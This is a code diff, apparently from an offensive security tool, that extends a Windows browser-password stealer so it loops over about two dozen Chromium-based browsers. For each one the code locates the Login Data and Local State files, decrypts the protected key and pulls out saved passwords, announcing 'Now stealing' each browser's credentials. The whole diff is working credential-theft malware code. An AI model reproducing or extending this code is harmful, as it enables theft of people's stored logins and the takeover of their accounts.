@@ -21,7 +21,66 @@
 // part of encrypted key
 #define DPAPI_KEY_PREFIX_LENGTH 5
 
-// Retrieve an encrypted and base64 encoded key from the `localStatePath` full
+// Hardcoded list of chromium browsers, taken from here:
+// https://github.com/AlessandroZ/LaZagne/blob/master/Windows/lazagne/softwares/browsers/chromium_browsers.py
+// With Yandex removed as it needs special handling
+BrowserInfo browsers[] = {
+    {L"7Star", L"\\7Star\\7Star\\User Data\\Default\\Login Data",
+     L"\\7Star\\7Star\\User Data\\Local State"},
+    {L"Amigo", L"\\Amigo\\User Data\\Default\\Login Data",
+     L"\\Amigo\\User Data\\Local State"},
+    {L"Brave",
+     L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
+     L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"},
+    {L"CentBrowser", L"\\CentBrowser\\User Data\\Default\\Login Data",
+     L"\\CentBrowser\\User Data\\Local State"},
+    {L"Chedot", L"\\Chedot\\User Data\\Default\\Login Data",
+     L"\\Chedot\\User Data\\Local State"},
+    {L"Chrome Beta", L"\\Google\\Chrome Beta\\User Data\\Default\\Login Data",
+     L"\\Google\\Chrome Beta\\User Data\\Local State"},
+    {L"Chrome Canary", L"\\Google\\Chrome SxS\\User Data\\Default\\Login Data",
+     L"\\Google\\Chrome SxS\\User Data\\Local State"},
+    {L"Chromium", L"\\Chromium\\User Data\\Default\\Login Data",
+     L"\\Chromium\\User Data\\Local State"},
+    {L"Microsoft Edge", L"\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+     L"\\Microsoft\\Edge\\User Data\\Local State"},
+    {L"CocCoc", L"\\CocCoc\\Browser\\User Data\\Default\\Login Data",
+     L"\\CocCoc\\Browser\\User Data\\Local State"},
+    {L"Comodo Dragon", L"\\Comodo\\Dragon\\User Data\\Default\\Login Data",
+     L"\\Comodo\\Dragon\\User Data\\Local State"},
+    {L"Elements Browser", L"\\Elements Browser\\User Data\\Default\\Login Data",
+     L"\\Elements Browser\\User Data\\Local State"},
+    {L"DCBrowser", L"\\DCBrowser\\User Data\\Default\\Login Data",
+     L"\\DCBrowser\\User Data\\Local State"},
+    {L"Epic Privacy Browser",
+     L"\\Epic Privacy Browser\\User Data\\Default\\Login Data",
+     L"\\Epic Privacy Browser\\User Data\\Local State"},
+    {L"Google Chrome", L"\\Google\\Chrome\\User Data\\Default\\Login Data",
+     L"\\Google\\Chrome\\User Data\\Local State"},
+    {L"Kometa", L"\\Kometa\\User Data\\Default\\Login Data",
+     L"\\Kometa\\User Data\\Local State"},
+    {L"Opera", L"{APPDATA}\\Opera Software\\Opera Stable\\Default\\Login Data",
+     L"{APPDATA}\\Opera Software\\Opera Stable\\Local State"},
+    {L"Opera GX",
+     L"{APPDATA}\\Opera Software\\Opera GX Stable\\Default\\Login Data",
+     L"{APPDATA}\\Opera Software\\Opera GX Stable\\Local State"},
+    {L"Orbitum", L"\\Orbitum\\User Data\\Default\\Login Data",
+     L"\\Orbitum\\User Data\\Local State"},
+    {L"QQBrowser", L"\\Tencent\\QQBrowser\\User Data\\Default\\Login Data",
+     L"\\Tencent\\QQBrowser\\User Data\\Local State"},
+    {L"SogouExplorer",
+     L"{APPDATA}\\SogouExplorer\\Webkit\\User Data\\Default\\Login Data",
+     L"{APPDATA}\\SogouExplorer\\Webkit\\User Data\\Local State"},
+    {L"Sputnik", L"\\Sputnik\\Sputnik\\User Data\\Default\\Login Data",
+     L"\\Sputnik\\Sputnik\\User Data\\Local State"},
+    {L"Torch", L"\\Torch\\User Data\\Default\\Login Data",
+     L"\\Torch\\User Data\\Local State"},
+    {L"Uran", L"\\uCozMedia\\Uran\\User Data\\Default\\Login Data",
+     L"\\uCozMedia\\Uran\\User Data\\Local State"},
+    {L"Vivaldi", L"\\Vivaldi\\User Data\\Default\\Login Data",
+     L"\\Vivaldi\\User Data\\Local State"},
+};
+
 // NOTE: `encryptedKeyOut` must be freed by the caller
 static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
   HANDLE fileHandle =
@@ -167,28 +226,34 @@ static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
   return EXIT_SUCCESS;
 }
 
-int steal_chromium_creds() {
+static int steal_browser_creds(BrowserInfo browser) {
   // login data contains each logins with the password encrypted and other
   // attributes in clear text
   PWSTR loginDataPath;
-  if (get_logindata_path(&loginDataPath) != EXIT_SUCCESS) {
-    fprintf(stderr, "Unable to get login data PATH");
+  if (get_logindata_path(browser.loginDataPath, &loginDataPath) !=
+      EXIT_SUCCESS) {
+    fwprintf(stderr, L"Unable to get login data PATH for %s\n",
+             browser.browserName);
     return EXIT_FAILURE;
   }
+
+  wprintf(L"=== Now stealing %s credentials ===\n", browser.browserName);
 
   Login *logins = NULL;
   int loginsCount = 0;
   if (chrmm_retrieve_logins(loginDataPath, &loginsCount, &logins) !=
       EXIT_SUCCESS) {
-    fprintf(stderr, "Could not retrieve logins from the database");
+    fprintf(stderr, "Could not retrieve logins from the database\n");
     return EXIT_FAILURE;
   }
 
-  // local state contains and encoded and decrypted key that once decrypted can
-  // decrypt a logins password with AES-GCM
+  // local state contains and encoded and decrypted key that once decrypted
+  // can decrypt a logins password with AES-GCM
   PWSTR localStatePath;
-  if (get_localstate_path(&localStatePath) != EXIT_SUCCESS) {
-    fprintf(stderr, "Unable to get local state PATH");
+  if (get_localstate_path(browser.localStatePath, &localStatePath) !=
+      EXIT_SUCCESS) {
+    fwprintf(stderr, L"Unable to get local state PATH for %s\n",
+             browser.browserName);
     return EXIT_FAILURE;
   }
 
@@ -233,6 +298,16 @@ int steal_chromium_creds() {
   free(encryptedKey);                // allocated in decode_key
   free(localStatePath);              // allocated in get_localstate_path
   free(loginDataPath);               // allocated in get_logindata_path
+
+  return EXIT_SUCCESS;
+}
+
+int steal_chromium_creds() {
+  for (int i = 0; i < sizeof(browsers) / sizeof(BrowserInfo); i++) {
+   if(steal_browser_creds(browsers[i]) != EXIT_SUCCESS){
+    fwprintf(stderr, L"Unable to find credentials for %s. Continuing...\n", browsers[i].browserName);
+   }
+  }
 
   return EXIT_SUCCESS;
 }
